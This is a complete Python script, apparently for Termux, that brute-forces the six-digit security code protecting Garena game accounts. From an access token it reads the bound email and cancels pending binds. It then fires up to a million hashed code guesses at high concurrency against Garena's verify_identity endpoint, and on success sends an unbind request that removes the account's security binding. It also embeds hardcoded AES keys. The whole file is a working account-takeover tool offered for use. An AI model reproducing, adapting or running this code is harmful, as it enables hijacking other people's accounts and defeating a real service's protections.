#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
/fastbk standalone – Termux script for Garena security code bruteforce.
Usage: python fastbk.py [concurrency]
Example: python fastbk.py 300
"""

import asyncio
import hashlib
import json
import os
import sys
from typing import List, Set, Dict, Any

import aiohttp
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------- Protobuf imports ----------
try:
    import MajoRLogin_pb2 as mLpB
    import MajorLoginRes_pb2 as mLrPb
except ImportError:
    print("❌ ERROR: MajoRLogin_pb2.py and MajorLoginRes_pb2.py must be in the same directory.")
    sys.exit(1)

# ---------- AES Keys ----------
AES_KEY = b'Yg&tc%DEuh6%Zc^8'
AES_IV = b'6oyZDr22E3ychjM%'

def encrypt(data: bytes) -> bytes:
    return AES.new(AES_KEY, AES.MODE_CBC, AES_IV).encrypt(pad(data, 16))

def decrypt(data: bytes) -> bytes:
    return unpad(AES.new(AES_KEY, AES.MODE_CBC, AES_IV).decrypt(data), 16)

# ---------- API Helpers ----------
async def get_bind_info(token: str) -> Dict[str, Any]:
    url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
    params = {"app_id": "100067", "access_token": token}
    headers = {"User-Agent": "GarenaMSDK/4.0.19P9"}
    async with aiohttp.ClientSession() as session:
        async with session.get(url, params=params, headers=headers, timeout=15) as resp:
            if resp.status != 200:
                raise Exception(f"HTTP {resp.status}")
            return await resp.json()

async def cancel_pending(token: str) -> bool:
    headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
    data = {"app_id": "100067", "access_token": token}
    async with aiohttp.ClientSession() as session:
        async with session.post("https://100067.connect.garena.com/game/account_security/bind:cancel_request",
                                headers=headers, data=data, timeout=10) as resp:
            return resp.status == 200

async def unbind_with_identity(token: str, identity: str) -> str:
    headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
    data = {"app_id": "100067", "access_token": token, "identity_token": identity}
    async with aiohttp.ClientSession() as session:
        async with session.post("https://100067.connect.garena.com/game/account_security/bind:create_unbind_request",
                                headers=headers, data=data, timeout=10) as resp:
            return await resp.text()

# ---------- Brute‑force core ----------
async def brute_force_codes(
    token: str,
    email: str,
    codes: List[str],
    concurrency: int = 150,
    tested_set: Set[str] = None,
    stage_name: str = "",
    progress_callback=None
) -> tuple:
    if tested_set is not None:
        codes = [c for c in codes if c not in tested_set]

    total = len(codes)
    if total == 0:
        return None, None

    sem = asyncio.Semaphore(concurrency)
    found = None
    identity = None
    tested = 0

    async def try_one(code: str):
        nonlocal found, identity, tested
        if found:
            return
        hashed = hashlib.sha256(code.encode('utf-8')).hexdigest()
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        data = {"email": email, "app_id": "100067", "access_token": token, "secondary_password": hashed}
        async with sem:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post("https://100067.connect.garena.com/game/account_security/bind:verify_identity",
                                            headers=headers, data=data, timeout=8) as resp:
                        tested += 1
                        if progress_callback:
                            await progress_callback(tested, total, stage_name)
                        if resp.status == 200:
                            j = await resp.json()
                            if j.get("identity_token"):
                                found = code
                                identity = j["identity_token"]
            except:
                pass

    chunk = 500
    for i in range(0, len(codes), chunk):
        if found:
            break
        tasks = [try_one(c) for c in codes[i:i+chunk]]
        await asyncio.gather(*tasks)

    return found, identity

# ---------- Code generators ----------
def generate_common_codes() -> List[str]:
    codes = set()
    for d in range(10):
        codes.add(f"{d}{d}{d}{d}{d}{d}")
    for i in range(10):
        for j in range(6):
            seq = ''.join(str((i+k) % 10) for k in range(6))
            codes.add(seq)
            seq_desc = ''.join(str((i-k) % 10) for k in range(6))
            codes.add(seq_desc)
    popular = [
        "123456", "654321", "111111", "000000", "123123", "321321",
        "112233", "223344", "334455", "445566", "556677", "667788",
        "778899", "889900", "990011", "101010", "202020", "303030",
        "404040", "505050", "606060", "707070", "808080", "909090",
        "123321", "456654", "789987", "147258", "258369", "369147",
        "159753", "753159", "951753", "357159", "012345", "987654",
        "135790", "246813", "369258", "481216", "512345", "623456",
        "734567", "845678", "956789", "067890", "178901", "289012",
        "390123", "401234", "512345"
    ]
    codes.update(popular)
    for y in range(10, 26):
        for m in range(1, 13):
            for d in range(1, 32):
                if d <= 31:
                    codes.add(f"{d:02d}{m:02d}{y:02d}")
                    codes.add(f"{m:02d}{d:02d}{y:02d}")
                    codes.add(f"{y:02d}{m:02d}{d:02d}")
    for i in range(1000):
        s = f"{i:03d}"
        codes.add(s + s)
    codes_list = list(codes)
    if len(codes_list) > 100000:
        codes_list = codes_list[:100000]
    return codes_list

def generate_full_codes_file():
    if not os.path.exists("HLO.txt"):
        print("⏳ Generating HLO.txt (1M codes) – this takes ~10 seconds...")
        with open("HLO.txt", "w") as f:
            for i in range(1000000):
                f.write(f"{i:06d}\n")

# ---------- Progress display ----------
def print_progress(tested: int, total: int, stage: str):
    percent = tested * 100 // total if total > 0 else 0
    bar_len = 30
    filled = int(bar_len * tested / total) if total > 0 else 0
    bar = '█' * filled + '░' * (bar_len - filled)
    sys.stdout.write(f'\r{stage}: {bar} {percent}% ({tested}/{total})')
    sys.stdout.flush()
    if tested == total:
        print()

# ---------- Main orchestrator ----------
async def run_fastbk(token: str, concurrency: int = 150):
    print("🔍 Fetching bind info...")
    try:
        bind = await get_bind_info(token)
        email = bind.get("email")
        if not email:
            print("❌ No bound email found.")
            return
        print(f"📧 Bound email: {email}")
        if bind.get("email_to_be"):
            print("🔄 Pending bind found. Cancelling...")
            if await cancel_pending(token):
                print("✅ Pending cancelled.")
            else:
                print("⚠️ Could not cancel, continuing.")
    except Exception as e:
        print(f"❌ Error fetching bind info: {e}")
        return

    tested_set = set()

    # ---- Quick check defaults ----
    print("🔍 Quick check: trying 000000 and 123456...")
    for default in ["000000", "123456"]:
        if default in tested_set:
            continue
        hashed = hashlib.sha256(default.encode()).hexdigest()
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        data = {"email": email, "app_id": "100067", "access_token": token, "secondary_password": hashed}
        async with aiohttp.ClientSession() as session:
            async with session.post("https://100067.connect.garena.com/game/account_security/bind:verify_identity",
                                    headers=headers, data=data, timeout=8) as resp:
                tested_set.add(default)
                if resp.status == 200:
                    j = await resp.json()
                    if j.get("identity_token"):
                        print(f"✅ Bypass: Found code {default}!")
                        await finalize_unbind(token, j["identity_token"])
                        return

    # ---- Stage 1: 100k common codes split 50k+50k ----
    common_list = generate_common_codes()
    batch1 = common_list[:50000]
    batch2 = common_list[50000:100000]

    print(f"🔍 Stage 1A: Trying first 50,000 common codes (concurrency={concurrency})...")
    found, identity = await brute_force_codes(
        token, email, batch1, concurrency=concurrency,
        tested_set=tested_set,
        stage_name="1A",
        progress_callback=print_progress
    )
    if found:
        print(f"✅ FOUND: {found}")
        await finalize_unbind(token, identity)
        return

    print(f"\n🔍 Stage 1B: Trying next 50,000 common codes (concurrency={concurrency})...")
    found, identity = await brute_force_codes(
        token, email, batch2, concurrency=concurrency,
        tested_set=tested_set,
        stage_name="1B",
        progress_callback=print_progress
    )
    if found:
        print(f"✅ FOUND: {found}")
        await finalize_unbind(token, identity)
        return

    # ---- Stage 2: Extended 100k sequential ----
    print(f"\n🔍 Stage 2: Trying 100,000 sequential (000000-099999) (concurrency={concurrency})...")
    ext = [f"{i:06d}" for i in range(100000)]
    found, identity = await brute_force_codes(
        token, email, ext, concurrency=concurrency,
        tested_set=tested_set,
        stage_name="Stage 2",
        progress_callback=print_progress
    )
    if found:
        print(f"✅ FOUND: {found}")
        await finalize_unbind(token, identity)
        return

    # ---- Stage 3: Full 1M ----
    print(f"\n🔍 Stage 3: Trying full 1,000,000 codes (concurrency={concurrency})... (may take hours)")
    generate_full_codes_file()
    with open("HLO.txt", "r") as f:
        full = [line.strip() for line in f if line.strip()]
    found, identity = await brute_force_codes(
        token, email, full, concurrency=concurrency,
        tested_set=tested_set,
        stage_name="Stage 3",
        progress_callback=print_progress
    )
    if found:
        print(f"✅ FOUND: {found}")
        await finalize_unbind(token, identity)
    else:
        print("❌ All stages exhausted. Unbind failed.")

async def finalize_unbind(token: str, identity: str):
    print("\n🔄 Sending unbind request...")
    resp = await unbind_with_identity(token, identity)
    try:
        j = json.loads(resp)
        if j.get("result") == 0:
            print("✅ UNBIND SUCCESSFUL!")
        else:
            print(f"❌ Unbind failed: {j}")
    except:
        print(f"❌ Unbind response: {resp}")

# ---------- Entry point ----------
if __name__ == "__main__":
    print("\n" + "="*50)
    print("   /fastbk – Garena Security Code Brute‑forcer")
    print("="*50 + "\n")
    token = input("🔑 Enter Access Token: ").strip()
    if not token:
        print("❌ Token cannot be empty.")
        sys.exit(1)

    # Parse concurrency from command line
    concurrency = 150
    if len(sys.argv) > 1:
        try:
            concurrency = int(sys.argv[1])
            print(f"⚡ Using concurrency: {concurrency}")
        except ValueError:
            print("⚠️ Invalid concurrency value, using default 150.")
    asyncio.run(run_fastbk(token, concurrency))
